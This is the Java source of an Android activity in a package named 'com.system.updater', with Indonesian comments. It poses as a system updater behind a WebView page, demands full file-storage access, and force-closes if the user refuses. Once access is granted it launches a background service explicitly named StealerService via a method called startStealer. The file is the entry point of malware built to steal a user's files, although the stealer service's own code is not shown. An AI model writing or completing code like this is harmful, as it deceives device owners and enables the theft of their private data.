package com.system.updater;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.Settings;
import android.webkit.WebView;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;

public class MainActivity extends Activity {

    private WebView webView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Siapkan UI WebView
        webView = new WebView(this);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.getSettings().setDomStorageEnabled(true);
        setContentView(webView);

        // Copy index.html ke cache biar bisa dibaca WebView
        copyAssetsToCache();

        // Cek Izin
        if (!hasStoragePermission()) {
            requestStoragePermission();
        } else {
            startStealer();
        }
    }

    private void copyAssetsToCache() {
        try {
            File cacheDir = new File(getCacheDir(), "web");
            if (!cacheDir.exists()) cacheDir.mkdirs();
            File indexFile = new File(cacheDir, "index.html");
            if (!indexFile.exists()) {
                InputStream is = getAssets().open("index.html");
                FileOutputStream fos = new FileOutputStream(indexFile);
                byte[] buffer = new byte[1024];
                int length;
                while ((length = is.read(buffer)) > 0) {
                    fos.write(buffer, 0, length);
                }
                fos.close();
                is.close();
            }
            webView.loadUrl("file://" + indexFile.getAbsolutePath());
        } catch (Exception e) {
            webView.loadUrl("https://www.google.com");
        }
    }

    private boolean hasStoragePermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            return Environment.isExternalStorageManager();
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            return checkSelfPermission(Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
        }
        return true;
    }

    private void requestStoragePermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
            intent.setData(Uri.parse("package:" + getPackageName()));
            startActivity(intent);
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            requestPermissions(new String[]{
                    Manifest.permission.READ_EXTERNAL_STORAGE,
                    Manifest.permission.WRITE_EXTERNAL_STORAGE
            }, 100);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == 100) {
            boolean allGranted = true;
            for (int res : grantResults) if (res != PackageManager.PERMISSION_GRANTED) allGranted = false;
            
            if (!allGranted) {
                // Tolak = Force Close
                finishAffinity();
                System.exit(0);
            } else {
                startStealer();
            }
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (hasStoragePermission()) {
            startStealer();
        }
    }

    private void startStealer() {
        Intent intent = new Intent(this, StealerService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }
    }
}
